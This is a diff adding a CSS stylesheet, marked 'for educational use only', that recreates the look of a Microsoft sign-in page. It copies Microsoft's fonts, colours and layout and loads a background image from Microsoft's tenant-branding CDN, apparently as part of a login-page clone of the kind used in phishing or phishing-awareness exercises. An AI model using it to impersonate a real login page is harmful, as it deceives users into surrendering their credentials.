@@ -1,0 +1,236 @@
+/*
+    Made by Mike Zawisza for educational use only
+*/
+body
+{
+    margin:0;
+    padding:0;
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+    font-weight: 400;
+    background: url(https://aadcdn.msauthimages.net/dbd5a2dd-mkfmwb-onlbciez8lsk6qfusvykmyp58unc8s5kn-qs/logintenantbranding/0/illustration?ts=637322625959508689) no-repeat center center fixed;
+    background-size: cover;
+}
+
+#overlay 
+{
+    box-shadow: 0px 0px 1px 5000px rgba(0,0,0,0.55);
+} 
+
+#loginForm
+{
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin-left: -220px;
+    margin-top: -300px;
+    width: 440px;
+    box-sizing: border-box;
+    border: 1px solid rgba(0,0,0,1)    
+}
+
+#signIn
+{
+    height: 310px;
+    width: 440px;
+    background: #ffffff;
+    padding: 45px;
+    box-sizing: border-box;
+}
+
+#cantAccessAccount
+{
+    position: relative;
+    top: -15px;
+    font-size: .8125rem;
+    line-height: 1.25rem;
+} 
+
+#BoilerPlateText
+{
+    width: 355px;
+    height: 270;
+    background: #f2f2f2;
+    padding-left: 45px;
+    padding-right: 40px;
+    padding-top: 15px;
+    padding-bottom: 15px;
+    font-family: "Segoe UI Webfont","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-weight: 400;
+    font-size: .9375rem;
+    line-height: 1.25rem;
+}
+
+
+.container h1
+{
+    text-align: left;
+    line-height: 1.75rem;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+   color: #1b1b1b;
+    font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+}
+
+.container input
+{
+    margin-bottom: 30px;
+    line-height: 1.8;
+    width: 100%;
+    font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+    box-shadow: none;
+    outline: none;
+    border: none;
+    border-bottom: 1px solid #666666;
+}
+.container input:hover
+{
+    border-bottom: 1px solid #000000;
+}
+.container input:active
+{
+    border-bottom: 1px solid #0067b8;
+}
+
+.container a
+{
+    color: #0067b8;
+    text-decoration:none;
+    box-sizing: border-box;
+}
+.container a:hover
+{
+    color: #666666;
+    text-decoration: underline;
+
+}
+.container a:active
+{
+    color: #999999;
+    text-decoration: underline;
+
+}
+
+.container input[type="submit"]
+{
+    cursor: pointer;
+    background: #0067b8;
+    color: #ffffff;
+    display: block;
+    width: 108px;
+    height: 32px;
+    font-family: "Segoe UI Webfont","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-weight: 400;
+    font-size: 15px;
+    margin-right: 0px;
+}
+.container input[type="submit"]:hover
+{
+    background: #005da6;
+}
+.container input[type="button"]
+{
+    cursor: pointer;
+    background: #cccccc;
+    border: #cccccc;
+    color: #000;
+    display: block;
+    width: 108px;
+    height: 32px;
+    font-family: "Segoe UI Webfont","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-weight: 400;
+    font-size: 15px;
+    margin-right: 4px;
+}
+.container input[type="button"]:hover
+{
+    background: #b2b2b2;
+}
+
+#Next
+{
+    cursor: pointer;
+    background: #0067b8;
+    color: #ffffff;
+    display: block;
+    width: 108px;
+    height: 32px;
+    font-family: "Segoe UI Webfont","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-weight: 400;
+    font-size: 15px;
+    margin-right: 0px;
+}
+#Next:hover
+{
+    background: #005da6;
+}
+
+#returnToEmail
+{
+    width: 25px; 
+    height:25px; 
+    border-radius:50%;
+    float: left;
+    /*display: inline;
+    display:block;*/
+    padding: 0px;
+    border: none;
+    background: none;
+}
+#returnToEmail:hover
+{
+    background: #e5e5e5;
+}
+
+#emailAddress
+{
+    display: block;
+    float: left;
+    margin-top: 0px;
+    margin-left: 5px;
+}
+
+.footer
+{
+    position: fixed;
+    left: 0;
+    bottom: 0;
+    width: 100%;
+    height: 25px;
+    background: rgba(0,0,0,0.55);
+    text-align: right;
+    font-size: 12px;
+    line-height: 5px;
+    color: #ffffff;
+
+}
+.footer a
+{   
+    margin-left: 8px;
+    margin-right: 8px;
+    text-decoration:none;
+    box-sizing: border-box;
+    color: #ffffff;
+}
+.footer a:hover
+{
+    text-decoration: underline;
+
+}
+.footer a:active
+{
+    text-decoration: underline;
+
+}
+
+.error
+{
+    color: red;
+}
+
+.Hidden{
+    visibility: hidden;
+    display: none;
+}
